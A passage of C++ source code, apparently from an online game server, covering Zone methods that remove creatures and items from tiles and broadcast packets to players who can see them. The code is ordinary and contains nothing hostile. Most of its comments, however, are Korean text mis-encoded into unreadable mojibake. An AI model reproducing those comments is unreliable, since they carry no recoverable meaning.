		try {
			getTile(x, y).deleteCreature(pCreature->getObjectID());
		} catch (NoSuchElementException& nsee) {
			// by sigi. 2002.12.10
			// Player³ž¯°¡ »¶§..
			// [1] PCManager::killCreature()¿¡­ tile¿¡­Ž ö¿ì°í žñ¥ž ³°í
			// [2] EventResurrect¿¡­ IncomingPlayer· ºž³»žé.. °±â­ ûý Zone¿¡ µéŸî°¡Žµ¥..
			//  µ °ú.. »ç¿¡­ Ÿ÷ ZonePlayerManager¿¡ Ž µ¿Ÿ Payºž°°º°· ­
			// transportµžé.. tile¿¡­ ö¿ì·°í ¶§ ¹®°¡ »ý±äŽ..°í ºž¿©øŽ.
			// Ž, ± ºº(ZPM::pay©)¿¡­Ž GPS_NORMAL °æ¿ìžž µµ· °öžž.
			// °µµ ¹«žžŽ°í ºž¿©ö¹·.. Ž ·±žž ³²±â.
			filelog("zoneDeleteCreatureError.log", "%s", nsee.toString().c_str());
		}

		// º¯ PCµé¿¡° ©ž®³°¡ »ç¶ó³ŽŽ »ç» ºê·µå³º®Ž.
		GCDeleteObject gcDeleteObject(pCreature->getObjectID());
		broadcastPacket(x, y, &gcDeleteObject, pCreature);
	} 
	catch (Throwable & t) 
	{
		cerr << t.toString() << endl;
		filelog("zoneDeleteCreatureError.log", "Zone::deleteCreature() : %s", t.toString().c_str());
	}

	__END_PROFILE_ZONE("Z_DELETE_CREATURE")

	__END_CATCH
}


//--------------------------------------------------------------------------------
//
//--------------------------------------------------------------------------------
void Zone::deleteObject(Object* pObject, ZoneCoord_t x, ZoneCoord_t y)
	throw(NoSuchElementException, Error)
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_DELETE_OBJECT")

	//--------------------------------------------------
	// ž¿¡­ °Žž »èŽ.
	//--------------------------------------------------
	getTile(x, y).deleteObject(pObject->getObjectID());

	//--------------------------------------------------
	// º¯ PCµé¿¡° °Ž°¡ »ç¶ó³ŽŽ »ç» ºê·µå³º®Ž.
	//--------------------------------------------------
	GCDeleteObject gcDeleteObject(pObject->getObjectID());

	broadcastPacket(x, y, &gcDeleteObject);

	__END_PROFILE_ZONE("Z_DELETE_OBJECT")

	__END_CATCH
}

//--------------------------------------------------------------------------------
//
//--------------------------------------------------------------------------------
void Zone::deleteItem(Object* pObject, ZoneCoord_t x, ZoneCoord_t y)
	throw(NoSuchElementException, Error)
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_DELETE_ITEM")

	deleteFromItemList(pObject->getObjectID());

	//--------------------------------------------------
	// ž¿¡­ °Žž »èŽ.
	//--------------------------------------------------
	getTile(x, y).deleteItem();

	
	if ( pObject->getObjectClass() == Object::OBJECT_CLASS_ITEM )
	{
		// º¹° ºž°ü °æ¿ì Block » Ÿ Ž.
		Item* pItem = dynamic_cast<Item*>(pObject);
		Assert( pItem != NULL );
		if ( pItem->getItemClass() == Item::ITEM_CLASS_CORPSE 
			&& pItem->getItemType() == MONSTER_CORPSE )
		{
			MonsterCorpse* pCorpse = dynamic_cast<MonsterCorpse*>(pItem);
			Assert( pCorpse != NULL );

			if ( pCorpse->isFlag(Effect::EFFECT_CLASS_SLAYER_RELIC_TABLE)
			  || pCorpse->isFlag(Effect::EFFECT_CLASS_VAMPIRE_RELIC_TABLE) 
			  || pCorpse->isFlag(Effect::EFFECT_CLASS_SHRINE_GUARD) 
			  || pCorpse->isFlag(Effect::EFFECT_CLASS_SHRINE_HOLY)) 
			{
				Tile& rTile = getTile( x, y );

				// ºí· ³¯ž®±â
				rTile.clearBlocked( Creature::MOVE_MODE_WALKING );
				rTile.clearBlocked( Creature::MOVE_MODE_BURROWING );
			}
		}

		if ( isRelicItem( pItem ) )
		{
			deleteEffectRelicPosition( pItem );
		}
	}
		
	//--------------------------------------------------
	// º¯ PCµé¿¡° °Ž°¡ »ç¶ó³ŽŽ »ç» ºê·µå³º®Ž.
	//--------------------------------------------------
//	GCDeleteObject gcDeleteObject(pObject->getObjectID());

//	broadcastPacket(x, y, &gcDeleteObject);

	__END_PROFILE_ZONE("Z_DELETE_ITEM")

	__END_CATCH
}


//--------------------------------------------------------------------------------
//
// broadcast packet
//
// ¯ ž¿¡ žçŽ, ownerž ¿ žðµç PC ¿¡° öµ ¶» üŽ.
//
//--------------------------------------------------------------------------------
void Zone::broadcastPacket(Packet* pPacket, Creature* owner)
	throw(ProtocolException, Error)
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_BC_PCMANAGER")
	m_pPCManager->broadcastPacket(pPacket, owner);
	__END_PROFILE_ZONE("Z_BC_PCMANAGER")

	__END_CATCH
}

void Zone::broadcastDarkLightPacket(Packet* pPacket1, Packet* pPacket2, Creature* owner)
	throw(ProtocolException, Error)
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_BC_DARKLIGHT")
	m_pPCManager->broadcastDarkLightPacket(pPacket1,  pPacket2, owner);
	__END_PROFILE_ZONE("Z_BC_DARKLIGHT")

	__END_CATCH
}

//--------------------------------------------------------------------
//
// » ºê·µå³º Ž öŽ. ­·Žž¥ Ÿ·°£¿¡Ž º ö ŸøŽ.-
// ¹ìŸî°¡ ºž³»Ž ¶º isVampire°¡ True· ³¯Ÿ¿Ž.
//
//--------------------------------------------------------------------
void Zone::broadcastSayPacket(ZoneCoord_t cx, ZoneCoord_t cy, Packet* pPacket, Creature* owner, bool isVampire)
	throw(ProtocolException, Error)
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_BC_SAY")

	ZoneCoord_t ix = 0;
	ZoneCoord_t iy = 0;
	ZoneCoord_t endx = 0;
	ZoneCoord_t endy = 0;

#ifdef __USE_ENCRYPTER__
	SocketEncryptOutputStream outputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
	outputStream.setEncryptCode( m_EncryptCode );
#else
	SocketOutputStream outputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
#endif
	pPacket->writeHeaderNBody( outputStream );

	//-------------------------------------------------------------------
	// ·ç º¯ö ±â­..
	//
	// Plus º¯ö°¡ ü °æ¿ì Range žž­ Žõ ºž³» Ž..
	// ±¿ª ž¶¹ý °á°úž ¿°úûž· ºž¿©±â §Ž.
	//
	// *NOTE
	// - û­ž Žžé VisionInfo¿¡ PLUS_SIGHT¶óŽ º¯öž °¡¿© ¿¬»ê
	//-------------------------------------------------------------------
	endx = min(m_Width - 1, cx + maxViewportWidth + 1);
	endy = min(m_Height - 1, cy + maxViewportLowerHeight  + 1);

	for (ix =  max(0, cx - maxViewportWidth - 1); ix <= endx ; ix++) 
	{
		for (iy = max(0, cy - maxViewportUpperHeight - 1); iy <= endy ; iy++) 
		{
			Tile& rTile = m_pTiles[ix][iy];	// by sigi. 2002.5.8

			// ž¿¡ ©ž®³°¡ Ž °æ¿ì¿¡žž
			if (rTile.hasCreature()) 
			{
				const list<Object*> & objectList = rTile.getObjectList();

				for (list<Object*>::const_iterator itr = objectList.begin() ; 
					itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE; 
					itr++) 
				{
					Creature* pCreature = dynamic_cast<Creature*>(*itr);		
					Assert(pCreature != NULL);

					// PCžé­, owner°¡ ŸŽžé­, (x,y)ž º ö Ž °æ¿ì
					if ((pCreature->isPC() && pCreature != owner && pCreature->getVisionState(cx,cy) >= IN_SIGHT) || (pCreature->isPC() && pCreature != owner))
					{
						// ûŸî Ž ³ ¹º þ» žé Ÿºž¿© Žµ¥.. µýþ žé Unborrowing Ÿ µŽµð.
						// ¹ìŸî°¡ ºž³»Ž ¶º isVampire°¡ True· ³¯Ÿ¿Ž.
						if (owner != NULL) 
						{

							// Creature ¿¡­ ObservingEye å®°¡ žžé å®ž °¡®¿Ž.
							EffectObservingEye* pEffectObservingEye = NULL;
							if ( pCreature->isFlag( Effect::EFFECT_CLASS_OBSERVING_EYE ) )
							{
								pEffectObservingEye = dynamic_cast<EffectObservingEye*>(pCreature->findEffect( Effect::EFFECT_CLASS_OBSERVING_EYE ) );
								//Assert( pEffectObservingEye != NULL );
							}

							if (!owner->isFlag(Effect::EFFECT_CLASS_GHOST)
								&& (!owner->isFlag(Effect::EFFECT_CLASS_HIDE) || pCreature->isVampire() || pCreature->isFlag(Effect::EFFECT_CLASS_DETECT_HIDDEN) )// || ( pEffectRevealer != NULL && pEffectRevealer->canSeeHide(owner) ) )
								&& (!owner->isFlag(Effect::EFFECT_CLASS_INVISIBILITY) || pCreature->isVampire() || pCreature->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) || ( pEffectObservingEye != NULL && pEffectObservingEye->canSeeInvisibility(owner) ) )
								&& (!owner->isFlag(Effect::EFFECT_CLASS_SNIPING_MODE) && !owner->isFlag(Effect::EFFECT_CLASS_SNIPING_MODE_2) || pCreature->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) ) // || ( pEffectRevealer != NULL && pEffectRevealer->canSeeSniping(owner) ) )
								&& ((isVampire && pCreature->isVampire()) || (!isVampire && pCreature->isSlayer()) || pCreature->isOusters())
								)
							{
								//pCreature->getPlayer()->sendPacket(pPacket);
								pCreature->getPlayer()->sendStream( &outputStream );
							}
						} 
						else 
						{
							//pCreature->getPlayer()->sendPacket(pPacket);
							pCreature->getPlayer()->sendStream( &outputStream );
						}
					}
				}
			}
		}
	}

	__END_PROFILE_ZONE("Z_BC_SAY")

	__END_CATCH
}

//--------------------------------------------------------------------------------
//
// broadcast packet
//
// (x,y)  »ç°» º ö Ž, ownerž ¿ žðµç PC µé¿¡° ¶» ºê·µå³º®Ž.
//
// *CAUTION*
//
// unsigned char ž ZoneCoord_t · »ç¿ë ¶§, overflow ¹ underflow ž  °
//
//--------------------------------------------------------------------------------
void Zone::broadcastPacket(ZoneCoord_t cx, ZoneCoord_t cy, Packet* pPacket, Creature* owner, bool Plus, Range_t Range)
	throw(ProtocolException, Error)
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_BC_NORMAL")

#ifdef __USE_ENCRYPTER__
	SocketEncryptOutputStream outputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
	outputStream.setEncryptCode( m_EncryptCode );
#else
	SocketOutputStream outputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
#endif
	pPacket->writeHeaderNBody( outputStream );

	ZoneCoord_t ix = 0;
	ZoneCoord_t iy = 0;
	ZoneCoord_t endx = 0;
	ZoneCoord_t endy = 0;

	//-------------------------------------------------------------------
	// ·ç º¯ö ±â­..
	//
	// Plus º¯ö°¡ ü °æ¿ì Range žž­ Žõ ºž³» Ž..
	// ±¿ª ž¶¹ý °á°úž ¿°úûž· ºž¿©±â §Ž.
	//
	// *NOTE
	// - û­ž Žžé VisionInfo¿¡ PLUS_SIGHT¶óŽ º¯öž °¡¿© ¿¬»ê
	//-------------------------------------------------------------------
	endx = min(m_Width - 1, cx + maxViewportWidth + 1 + Range);
	endy = min(m_Height - 1, cy + maxViewportLowerHeight  + 1 + Range);

	for (ix =  max(0, cx - maxViewportWidth - 1 - Range); ix <= endx ; ix++) 
	{
		for (iy = max(0, cy - maxViewportUpperHeight - 1 -  Range); iy <= endy ; iy++) 
		{
			// (ix,iy)¿¡­ (cx,cy)ž žø º °æ¿ì
			if ( VisionInfoManager::getVisionState( ix, iy, cx, cy ) == OUT_OF_SIGHT && !Plus ) continue;
			Tile& rTile = m_pTiles[ix][iy];	// by sigi.2002.5.8

			// ž¿¡ ©ž®³°¡ Ž °æ¿ì¿¡žž
			if (rTile.hasCreature()) 
			{
				const list<Object*> & objectList = rTile.getObjectList();

				Creature* pCreature = NULL;
				
				list<Object*>::const_iterator itr = objectList.begin();
				for ( ; itr != objectList.end(); ++itr) 
				{
					if ( (*itr) == NULL )
					{
						continue;
					}
					
					pCreature = dynamic_cast<Creature*>(*itr);		
					
					if ( pCreature == NULL )
					{
						continue;
					}
					
					if ( pCreature->getObjectPriority() > OBJECT_PRIORITY_BURROWING_CREATURE )
					{
						break;
					}

					// by sigi. 2002.5.14
					if (pCreature->isPC() && pCreature != owner )
						// §¿¡­ ©Ž. by Sequoia
//						&& (pCreature->getVisionState(cx,cy) >= IN_SIGHT || Plus))
					{
						// ûŸî Ž ³ ¹º þ» žé Ÿºž¿© Žµ¥.. µýþ žé Unborrowing Ÿ µŽµð.
						if (owner != NULL) 
						{
							// canSee ö· Žë. by bezz 2003.05.29
							if ( canSee( pCreature, owner ) )
							{
								//pCreature->getPlayer()->sendPacket(pPacket);
								pCreature->getPlayer()->sendStream( &outputStream );
							}
						} 
						else 
						{
							//pCreature->getPlayer()->sendPacket(pPacket);
							pCreature->getPlayer()->sendStream( &outputStream );
						}
					}
				}
			}
		}
	}

	__END_PROFILE_ZONE("Z_BC_NORMAL")

	__END_CATCH
}

void Zone::broadcastLevelWarBonusPacket(Packet* pPacket, Creature* owner)
	throw(ProtocolException, Error)
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_BC_PCMANAGER")
	m_pPCManager->broadcastLevelWarBonusPacket(pPacket, owner);
	__END_PROFILE_ZONE("Z_BC_PCMANAGER")

	__END_CATCH
}

//--------------------------------------------------------------------------------
//
// update scan
//
// ž®¿¡­ sight°¡ º¯» °æ¿ì. Add&Delete packet» ºž³Ž.
//
//--------------------------------------------------------------------------------
void Zone::updateScan (Creature* pPC, Sight_t oldSight, Sight_t newSight)
	throw (ProtocolException, Error)
{
	__BEGIN_TRY

	if (pPC == NULL || pPC->isPC() == false) return;
	//Assert(pPC != NULL);
	//Assert(pPC->isPC());

	__BEGIN_PROFILE_ZONE("Z_UPDATESCAN")

	//  sight º¯Ž ° °æ Ÿ ŸŽŽ.
/*	Coord_t cx = pPC->getX(), cy = pPC->getY();
	
	Player* pPlayer = pPC->getPlayer();
	Assert(pPlayer);

	for (ZoneCoord_t ix = max(0, cx - maxViewportWidth - 1), endx = min(m_Width - 1, cx + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, cy - maxViewportUpperHeight - 1), endy = min(m_Height - 1, cy + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
			VisionState oldVS = pPC->getVisionState(ix, iy, oldSight); 
			VisionState newVS = pPC->getVisionState(ix, iy, newSight);

			const list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();

			for (list<Object*>::const_iterator itr = objectList.begin() ; itr != objectList.end() ; itr++) 
			{

				Assert(*itr != NULL);

				// Ÿºž¿ŽŽ°¡ ºžŽ °æ¿ì..
				// ADD~~
				if (oldVS == OUT_OF_SIGHT && newVS != OUT_OF_SIGHT)
				{
					//--------------------------------------------------------------------------------
					// °¢ °Ž OBJECT CLASS¿¡ µû¶ó­ û GCAddXXX ¶» žžµéŸî­
					// owner ¿¡° üŽ. 
					// *NOTES*
					// °¡å âö ®·ü ³ôº °Ž CLASS °¡ case Ÿºº¿¡ ³ª¿Ÿ Ž.
					//--------------------------------------------------------------------------------
					switch ((*itr)->getObjectClass()) 
					{
						////////////////////////////////////////////////////////////
						////////////////////////////////////////////////////////////
						case Object::OBJECT_CLASS_CREATURE:
							{
								//--------------------------------------------------------------------------------
								// PC °æ¿ì pPacket» üŸ žç, !PC °æ¿ì¿¡Ž ü ¿ä°¡ ŸøŽ.
								// ¶ žðµç ©ž®³ ºžž owner¿¡° üŸ Ž.
								//--------------------------------------------------------------------------------
								Creature* pCreature = dynamic_cast<Creature*>(*itr);
								Assert(pCreature != NULL);

								// ±â  ºžŽ ¹» ¿ä°¡ ŸøŽ.
								if (pCreature == pPC) continue;

								switch (pCreature->getCreatureClass()) 
								{
									case Creature::CREATURE_CLASS_MONSTER :
										{
											Monster* pMonster = dynamic_cast<Monster*>(pCreature);

											// by sigi
											Packet* pAddMonsterPacket = createMonsterAddPacket( pMonster, pPC );

											if (pAddMonsterPacket!=NULL)
											{
												pPlayer->sendPacket( pAddMonsterPacket );

												delete pAddMonsterPacket;
											}
										}
										break;
			

									case Creature::CREATURE_CLASS_SLAYER:
										{
											// PC °¡ Revealer å®ž °¡ö°í Žžé å®ž °¡®¿Ž.
//											EffectRevealer* pEffectRevealer = NULL;
//											if ( pPC->isFlag( Effect::EFFECT_CLASS_REVEALER ) )
//											{
//												pEffectRevealer = dynamic_cast<EffectRevealer*>(pPC->findEffect( Effect::EFFECT_CLASS_REVEALER ) );
//												Assert( pEffectRevealer );
//											}

											if (!pCreature->isFlag(Effect::EFFECT_CLASS_GHOST)
												&& (!pCreature->isFlag(Effect::EFFECT_CLASS_SNIPING_MODE)
													|| pPC->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) ))
//												|| ( pEffectRevealer != NULL && pEffectRevealer->canSeeSniping(pCreature) ) )
											{
												Slayer* pSlayer = dynamic_cast<Slayer*>(pCreature);
												GCAddSlayer gcAddSlayer;
												makeGCAddSlayer(&gcAddSlayer, pSlayer);
												pPlayer->sendPacket(&gcAddSlayer);
											}
										}
										break;
			
									case Creature::CREATURE_CLASS_VAMPIRE :
										{
											// PC °¡ Revealer å®ž °¡ö°í Žžé å®ž °¡®¿Ž.
//											EffectRevealer* pEffectRevealer = NULL;
//											if ( pPC->isFlag( Effect::EFFECT_CLASS_REVEALER ) )
//											{
//												pEffectRevealer = dynamic_cast<EffectRevealer*>(pPC->findEffect( Effect::EFFECT_CLASS_REVEALER ) );
//												Assert( pEffectRevealer );
//											}

											// PC °¡ ObservingEye å®ž °¡ö°í Žžé å®ž °¡®¿Ž.
											EffectObservingEye* pEffectObservingEye = NULL;
											if ( pPC->isFlag( Effect::EFFECT_CLASS_OBSERVING_EYE ) )
											{
												pEffectObservingEye = dynamic_cast<EffectObservingEye*>(pPC->findEffect( Effect::EFFECT_CLASS_OBSERVING_EYE ) );
												//Assert( pEffectObservingEye != NULL );
											}

											//
											// hide¿ invisibilityŽ µ¿¿¡ »ç¿ëµ ö ŸøŽŽŽ °¡¿¡..
											// 
											if (!pCreature->isFlag(Effect::EFFECT_CLASS_GHOST))
											{
												if (pCreature->isFlag(Effect::EFFECT_CLASS_HIDE)) 
												{
													if (pPC->isVampire() || pPC->isFlag(Effect::EFFECT_CLASS_DETECT_HIDDEN) )
	//													|| ( pEffectRevealer != NULL && pEffectRevealer->canSeeHide( pCreature ) ) ) 
													{
														GCAddBurrowingCreature gcABC;
														gcABC.setObjectID(pCreature->getObjectID());
														gcABC.setName(pCreature->getName());
														gcABC.setX(ix);
														gcABC.setY(iy);

														pPlayer->sendPacket(&gcABC);
													}
												} 
												else 
												{
													if (!pCreature->isFlag(Effect::EFFECT_CLASS_INVISIBILITY))
													{
														Vampire* pVampire = dynamic_cast<Vampire*>(pCreature);
														GCAddVampire gcAddVampire;
														makeGCAddVampire(&gcAddVampire, pVampire);
														pPlayer->sendPacket(&gcAddVampire);
													}
													// pCreatureŽ invisibility»ó..
													else if (pPC->isVampire() || pPC->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) 
															|| ( pEffectObservingEye != NULL && pEffectObservingEye->canSeeInvisibility( pCreature ) ) )
													{
														// FIXME
														// ³¿¡µû¶ó­ Ÿî¶»° ºžö °áµ ..
														//
														Vampire* pVampire = dynamic_cast<Vampire*>(pCreature);
														GCAddVampire gcAddVampire;
														makeGCAddVampire(&gcAddVampire, pVampire);
														pPlayer->sendPacket(&gcAddVampire);
													}
												}
											}	
										}
										break;
			
									case Creature::CREATURE_CLASS_OUSTERS:
										{
											if ( !pCreature->isFlag(Effect::EFFECT_CLASS_GHOST) )
											{
												Ousters* pOusters = dynamic_cast<Ousters*>(pCreature);
												GCAddOusters gcAddOusters;
												makeGCAddOusters(&gcAddOusters, pOusters);
												pPlayer->sendPacket(&gcAddOusters);
											}
										}
										break;
			
									case Creature::CREATURE_CLASS_NPC :
										{
											NPC* pNPC = dynamic_cast<NPC*>(pCreature);
											GCAddNPC gcAddNPC;
											makeGCAddNPC(&gcAddNPC, pNPC);
											pPlayer->sendPacket(&gcAddNPC);
										}
										break;
			
									default :
										throw Error("invalid creature class");
		
								}//switch (pCreature->getCreatureClass())
							}//case Object::OBJECT_CLASS_CREATURE :
							break;

						//--------------------------------------------------------------------------------
						// ž §¿¡ Ÿ » °æ¿ì
						//--------------------------------------------------------------------------------
						case Object::OBJECT_CLASS_ITEM :
							{
								Item* pItem = dynamic_cast<Item*>(*itr);

								if (pItem->getItemClass() == Item::ITEM_CLASS_CORPSE) {
									switch (pItem->getItemType()) {
										case SLAYER_CORPSE :
											{
												SlayerCorpse* pSlayerCorpse = dynamic_cast<SlayerCorpse*>(pItem);
												GCAddSlayerCorpse gcAddSlayerCorpse;
												makeGCAddSlayerCorpse(&gcAddSlayerCorpse, pSlayerCorpse);
												pPlayer->sendPacket(&gcAddSlayerCorpse);
											}
											break;
										case VAMPIRE_CORPSE :
											{
												VampireCorpse* pVampireCorpse = dynamic_cast<VampireCorpse*>(pItem);
												GCAddVampireCorpse gcAddVampireCorpse;
												makeGCAddVampireCorpse(&gcAddVampireCorpse, pVampireCorpse);
												pPlayer->sendPacket(&gcAddVampireCorpse);
											}
											break;
										case NPC_CORPSE :
											{
												throw UnsupportedError();
											}
											break;
										case MONSTER_CORPSE :
											{
												MonsterCorpse* pMonsterCorpse = dynamic_cast<MonsterCorpse*>(pItem);
												GCAddMonsterCorpse gcAddMonsterCorpse;
												makeGCAddMonsterCorpse(&gcAddMonsterCorpse, pMonsterCorpse, ix, iy);
												pPlayer->sendPacket(&gcAddMonsterCorpse);

												sendRelicEffect( pMonsterCorpse, pPlayer );
											}
											break;
									}//switch
								} 
								// Mine InstallµŸî Ž °æ¿ì, DetectMine Ÿøžžé GCAddNewItemToZone Packet» ºž³»ö ŸŽŽ. 
								// ï º ö ŸøŽ.
								else if (pItem->getItemClass() == Item::ITEM_CLASS_MINE
									&& pItem->isFlag(Effect::EFFECT_CLASS_INSTALL))
								{
									if (pPC->isFlag(Effect::EFFECT_CLASS_REVEALER) )
									{
										GCAddInstalledMineToZone gcAddMine;
										gcAddMine.setObjectID(pItem->getObjectID());
										gcAddMine.setX(cx);
										gcAddMine.setY(cy);
										gcAddMine.setItemClass(pItem->getItemClass());
										gcAddMine.setItemType(pItem->getItemType());
										gcAddMine.setOptionType(pItem->getOptionTypeList());
										gcAddMine.setDurability(pItem->getDurability());
										pPlayer->sendPacket(&gcAddMine);

									}
								}
								else
								{
									GCAddNewItemToZone gcAddNewItemToZone;
									makeGCAddNewItemToZone(&gcAddNewItemToZone, pItem, ix, iy);
									pPlayer->sendPacket(&gcAddNewItemToZone);
								}
							}
							break;

						////////////////////////////////////////////////////////////
						////////////////////////////////////////////////////////////
						case Object::OBJECT_CLASS_EFFECT :
							{
								Effect* pEffect = dynamic_cast<Effect*>(*itr);
								if (pEffect->getEffectClass() == Effect::EFFECT_CLASS_VAMPIRE_PORTAL)
								{
									EffectVampirePortal* pEffectVampirePortal = dynamic_cast<EffectVampirePortal*>(pEffect);
									ZONE_COORD zonecoord = pEffectVampirePortal->getZoneCoord();

									GCAddVampirePortal gcAddVampirePortal;
									gcAddVampirePortal.setObjectID(pEffect->getObjectID());
									gcAddVampirePortal.setOwnerID(pEffectVampirePortal->getOwnerID());
									gcAddVampirePortal.setX(ix);
									gcAddVampirePortal.setY(iy);
									gcAddVampirePortal.setTargetZoneID(zonecoord.id);
									gcAddVampirePortal.setTargetX(zonecoord.x);
									gcAddVampirePortal.setTargetY(zonecoord.y);
									gcAddVampirePortal.setDuration(pEffectVampirePortal->getRemainDuration());
									gcAddVampirePortal.setCreateFlag(0);

									pPlayer->sendPacket(&gcAddVampirePortal);
								}
								// by sigi. 2002.6.10
								else if (pEffect->getEffectClass() == Effect::EFFECT_CLASS_SANCTUARY)
								{
									EffectSanctuary* pEffectSanctuary = dynamic_cast<EffectSanctuary*>(pEffect);

									ZoneCoord_t centerX = pEffectSanctuary->getCenterX();
									ZoneCoord_t centerY = pEffectSanctuary->getCenterY();
									
									// sanctuaryŽ ¥ °æ¿ìžž packet» ºž³Ž.
									if (centerX==ix && centerY==iy)
									{
										GCAddEffectToTile gcAddEffectToTile;

										gcAddEffectToTile.setObjectID(pEffect->getObjectID());
										gcAddEffectToTile.setXY(ix, iy); 
										gcAddEffectToTile.setEffectID(pEffect->getSendEffectClass());
										gcAddEffectToTile.setDuration(pEffect->getRemainDuration());

										pPlayer->sendPacket(&gcAddEffectToTile);
									}
								}
								// Broadcasting Effect ö © °¡ by Sequoia 2003.3.31
								else if (pEffect->isBroadcastingEffect())
								{
									GCAddEffectToTile gcAddEffectToTile;

									gcAddEffectToTile.setObjectID(pEffect->getObjectID());
									gcAddEffectToTile.setXY(ix, iy); 
									gcAddEffectToTile.setEffectID(pEffect->getSendEffectClass());
									gcAddEffectToTile.setDuration(pEffect->getRemainDuration());
			
									pPlayer->sendPacket(&gcAddEffectToTile);
								}
							}
							break;

						//--------------------------------------------------------------------------------
						// ž §¿¡ åŸ¹° » °æ¿ì
						//--------------------------------------------------------------------------------
						case Object::OBJECT_CLASS_OBSTACLE :
							{
							}
							break;

						//--------------------------------------------------------------------------------
						// ž §¿¡ ÷» » °æ¿ì
						//--------------------------------------------------------------------------------
						case Object::OBJECT_CLASS_PORTAL :
							{
							}
							break;

						default :
							throw Error("invalid object class");

					}//switch ((*itr)->getObjectClass())
				} // if
				// ºž¿ŽŽ°¡ ŸºžŽ °æ¿ì.
				else if (oldVS != OUT_OF_SIGHT && newVS == OUT_OF_SIGHT)
				{
					switch((*itr)->getObjectClass())
					{
						case Object::OBJECT_CLASS_CREATURE:
						case Object::OBJECT_CLASS_ITEM:
							{
								GCDeleteObject gcDO;
								gcDO.setObjectID((*itr)->getObjectID());
								pPlayer->sendPacket(&gcDO);
							}
							break;
						case Object::OBJECT_CLASS_EFFECT:
							{
								Effect* pEffect = dynamic_cast<Effect*>(*itr);
								GCDeleteEffectFromTile gcDeleteEffectFromTile;
								gcDeleteEffectFromTile.setObjectID((*itr)->getObjectID());
								gcDeleteEffectFromTile.setEffectID(pEffect->getSendEffectClass());
								gcDeleteEffectFromTile.setXY(ix, iy);
								pPlayer->sendPacket(&gcDeleteEffectFromTile);
							}
							break;
						default:;
							// Do nothing
					}
				}
			}	// for tile 
		}// for y
	}// for x
*/
	__END_PROFILE_ZONE("Z_UPDATESCAN")
	
	__END_CATCH
}



//--------------------------------------------------------------------------------
// broadcast packet
// (x1,y1) (x2,y2)  »ç°» º ö Ž,
// ownerž ¿ žðµç PC µé¿¡° ¶» ºê·µå³º®Ž.
// Tile ü¿ë º³ broadcastPacketŽ.
// *CAUTION*
// unsigned char ž ZoneCoord_t · »ç¿ë ¶§, overflow ¹ underflow ž  °
//--------------------------------------------------------------------------------
list<Creature*> Zone::broadcastSkillPacket(ZoneCoord_t x1, ZoneCoord_t y1, ZoneCoord_t x2, ZoneCoord_t y2, 
		Packet* pPacket ,list<Creature*> creatureList, bool bConcernDarkness)
	throw(ProtocolException, Error)
{
	__BEGIN_TRY

#ifdef __USE_ENCRYPTER__
	SocketEncryptOutputStream outputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
	outputStream.setEncryptCode( m_EncryptCode );
#else
	SocketOutputStream outputStream( NULL, szPacketHeader + pPacket->getPacketSize() + 2 );
#endif
	pPacket->writeHeaderNBody( outputStream );

	list<Creature*> cList;

	__BEGIN_PROFILE_ZONE("Z_BC_SKILL")

	ZoneCoord_t ix = 0;
	ZoneCoord_t iy = 0;
	ZoneCoord_t endx = 0;
	ZoneCoord_t endy = 0;

	//-------------------------------------------------------------------
	// ·ç º¯ö ±â­..
	//
	// Plus º¯ö°¡ ü °æ¿ì Range žž­ Žõ ºž³» Ž..
	// ±¿ª ž¶¹ý °á°úž ¿°úûž· ºž¿©±â §Ž.
	//
	// *NOTE
	//
	// - û­ž Žžé VisionInfo¿¡ PLUS_SIGHT¶óŽ º¯öž °¡¿© ¿¬»ê
	//
	//-------------------------------------------------------------------
	endx = min(m_Width - 1, x1 + maxViewportWidth + 1);
	endy = min(m_Height- 1, y1 + maxViewportLowerHeight + 1);

	for (ix = max(0, x1 - maxViewportWidth - 1); ix <= endx ; ix++) 
	{
		for (iy = max(0, y1 - maxViewportUpperHeight - 1); iy <= endy ; iy++) 
		{
			Tile& rTile = m_pTiles[ix][iy];	// by sigi.2002.5.8

			// ž¿¡ ©ž®³°¡ Ž °æ¿ì¿¡žž
			if (rTile.hasCreature()) 
			{
				const list<Object*> & objectList = rTile.getObjectList();

				for (list<Object*>::const_iterator itr = objectList.begin() ; itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE; itr++) 
				{

					Creature* pCreature = dynamic_cast<Creature*>(*itr);		
					Assert(pCreature != NULL);

					// PCžé­, creature list¿¡ ö Ÿžžé­ (x,y)ž º ö Ž °æ¿ì
					if (pCreature->isPC())
					{
						//  ¶» ¹»ý² ³ðµéöž ©Ž.
						bool belong = false;
						for (list<Creature*>::const_iterator itr = creatureList.begin() ; itr != creatureList.end() ; itr++) 
						{
							if (pCreature == *itr) 
							{
								belong = true;
								break;
							}
						}

						if (!belong && pCreature->getVisionState(x1,y1) >= IN_SIGHT && pCreature->getVisionState(x2, y2) >= IN_SIGHT)
						{
							// ûŸî Ž ³ Ÿ ºžžé­ º³» Ÿµ ¯°¡ ŸøŽ.. µû¶ó­ HIDE©Ž ö ŸŽŽ.
							Player* pPlayer = pCreature->getPlayer();
							//pPlayer->sendPacket(pPacket);
							pPlayer->sendStream( &outputStream );
							cList.push_back(pCreature);
						}
					}
				}
			}
		}
	}

	// add creature list to cList
	for (list<Creature*>::const_iterator itr = creatureList.begin(); itr != creatureList.end(); itr++)
	{
		cList.push_back(*itr);
	}

